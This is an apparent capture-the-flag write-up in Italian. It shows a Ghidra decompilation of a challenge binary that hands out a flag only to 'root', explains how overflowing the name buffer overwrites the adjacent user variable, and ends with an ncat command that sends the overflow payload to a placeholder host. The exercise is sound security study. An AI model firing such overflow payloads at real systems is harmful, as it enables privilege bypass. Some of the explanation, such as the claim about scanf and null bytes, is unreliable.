
>In C le stringhe sono array di caratteri, quindi il buffer (dimensione della stringa da inserire) deve essere specificato prima.

>Quando inseriamo una stringa che supera questo buffer, se non vengono eseguiti controlli si può andare in contro ad un **buffer overflow**

>Quello che viene scritto in eccesso non scompare, ma viene scritto in memoria.

>Se analizziamo il codice già compilato di C in Ghidra ci permetterà di analizzare il codice sorgente analizzandone l'ELF.
>Sarà di conseguenza possibile analizzare il codice sorgente
```C
undefined8 main(void)

{
  int iVar1;
  char *current_user_ptr;
  undefined8 uVar2;
  
  //Quello che eccede name_input va dentro current_user
  char name_input [100];
  char current_user [108];
  
  current_user_ptr = getenv("USER");  //Prende la variabile d'ambiente
  strcpy(current_user,current_user_ptr); //Salviamo la variabile l'ambiente dentro current_user
  puts("Howdy! What\'s your name?");
  __isoc23_scanf(&DAT_00102026,name_input); //nome inserito dall'utente
  iVar1 = strcmp("root",name_input);   //Compariamo le 2 stringhe
  if (iVar1 == 0) {   //vuol dire che le 2 stringhe erano uguali
    iVar1 = strcmp("root",current_user);  //compariamo effettivamente se lo user ricavato tramite l'ENV è root
    if (iVar1 == 0) {
      puts("Hi, root! Here\'s your flag. Please keep it to yourself:");
      current_user_ptr = getenv("FLAG");
      puts(current_user_ptr);
      uVar2 = 0;
    }
    else {
      printf("Liar! You are not root, you are %s!",current_user);
      uVar2 = 1;
    }
  }
  else {
    puts("Sorry, you must be root to get the flag!");
    uVar2 = 1;
  }
  return uVar2;
```

>Lo scanf smette di leggere l'input dell'utente quando rileva un **null byte (\x00)**
>Quindi se occupiamo interamente il buffer di name_input il resto occuperà la variabile current_user
```C
char name_input [100];
char current_user [108];
```


>Per risolvere facciamo:
```shell
echo root\x00TANTICARATTERIQUANTIPERRIEMPIREILBUFFERroot | ncat ip porta
```